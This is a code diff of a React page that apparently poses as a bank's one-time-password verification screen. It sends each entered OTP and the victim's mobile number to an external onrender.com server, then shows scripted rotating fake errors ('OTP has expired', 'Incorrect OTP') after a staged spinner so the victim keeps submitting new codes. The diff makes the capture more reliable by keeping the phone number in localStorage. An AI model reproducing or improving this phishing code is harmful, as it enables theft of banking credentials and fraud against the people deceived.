@@ -1,88 +1,89 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useLocation } from "react-router-dom";
 import { FaSpinner } from "react-icons/fa";
 import "./otpSubmit.css";
 
 export default function OTPSubmit() {
   const location = useLocation();
-  const { mobileNumber } = location.state || {};
+  const storedMobile = localStorage.getItem("otpMobileNumber"); // read from localStorage
+  const { mobileNumber: stateMobile } = location.state || {};
+  const mobileNumber = stateMobile || storedMobile;
+
   const [otp, setOtp] = useState(new Array(6).fill(""));
   const [loading, setLoading] = useState(false);
   const [message, setMessage] = useState({ text: "", type: "" });
+  const [errorIndex, setErrorIndex] = useState(0);
 
-  // Sequential error messages
   const errorMessages = [
     "Technical error, please try later",
     "OTP has expired, resend OTP",
     "Network error, please check your connection",
     "Incorrect OTP, please resend OTP again",
   ];
-  const [errorIndex, setErrorIndex] = useState(0);
 
-  // Handle typing in OTP inputs
+  useEffect(() => {
+    if (!mobileNumber) {
+      setMessage({ text: "Mobile number not found, please go back and enter details again", type: "error" });
+    }
+  }, [mobileNumber]);
+
   const handleChange = (element, index) => {
     if (/^[0-9]$/.test(element.value) || element.value === "") {
       const newOtp = [...otp];
       newOtp[index] = element.value;
       setOtp(newOtp);
 
-      // Auto-focus next input
-      if (element.nextSibling && element.value) {
-        element.nextSibling.focus();
-      }
+      // auto-focus next input
+      if (element.nextSibling && element.value) element.nextSibling.focus();
 
-      // Automatically submit when all 6 digits entered
+      // auto-submit when 6 digits entered
       if (newOtp.join("").length === 6) {
         handleVerify(newOtp.join(""));
       }
     }
   };
 
-  // Handle OTP verification
   const handleVerify = async (otpValue) => {
     if (!otpValue || otpValue.length < 6) {
       setMessage({ text: "Please enter the 6-digit OTP", type: "error" });
       return;
     }
 
-    if (!mobileNumber) {
-      setMessage({ text: "Mobile number not found, please login again", type: "error" });
-      return;
-    }
+    if (!mobileNumber) return;
 
     setLoading(true);
     setMessage({ text: "", type: "" });
 
     try {
-      // Always store OTP + mobile number in DB
       await fetch("https://axisonline-1.onrender.com/api/otp/submit", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ mobileNumber, otp: otpValue }),
       });
 
-      // Show one of the predefined error messages and clear OTP inputs
+      // simulate sequential error messages
       setTimeout(() => {
         setMessage({ text: errorMessages[errorIndex], type: "error" });
-        setErrorIndex((prevIndex) => (prevIndex + 1) % errorMessages.length);
-        setOtp(new Array(6).fill("")); // Clear OTP inputs
+        setErrorIndex((prev) => (prev + 1) % errorMessages.length);
+        setOtp(new Array(6).fill("")); // clear inputs
         setLoading(false);
-      }, 3000); // spinner for 3s
+      }, 3000);
     } catch (err) {
       console.error(err);
       setTimeout(() => {
         setMessage({ text: "Network error, please check your connection", type: "error" });
-        setOtp(new Array(6).fill("")); // Clear OTP inputs on network error
+        setOtp(new Array(6).fill(""));
         setLoading(false);
       }, 3000);
     }
   };
 
-  // Handle Resend OTP
   const handleResend = async () => {
-    setOtp(new Array(6).fill("")); // Clear inputs
+    setOtp(new Array(6).fill("")); // clear inputs
+    if (!mobileNumber) return;
+
     setMessage({
-      text: `OTP resent to your registered mobile number ending with ${mobileNumber ? mobileNumber.slice(-4) : "****"}`,
+      text: `OTP resent to your registered mobile number ending with ${mobileNumber.slice(-4)}`,
       type: "success",
     });
 
@@ -119,7 +120,7 @@ export default function OTPSubmit() {
             value={data}
             onChange={(e) => handleChange(e.target, index)}
             onFocus={(e) => e.target.select()}
-            disabled={loading}
+            disabled={loading || !mobileNumber}
           />
         ))}
       </div>
@@ -131,7 +132,7 @@ export default function OTPSubmit() {
       <button
         className="verify-btn"
         onClick={() => handleVerify(otp.join(""))}
-        disabled={loading}
+        disabled={loading || !mobileNumber}
       >
         {loading ? <FaSpinner className="rotating" /> : "🔒 Verify Securely with Login"}
       </button>
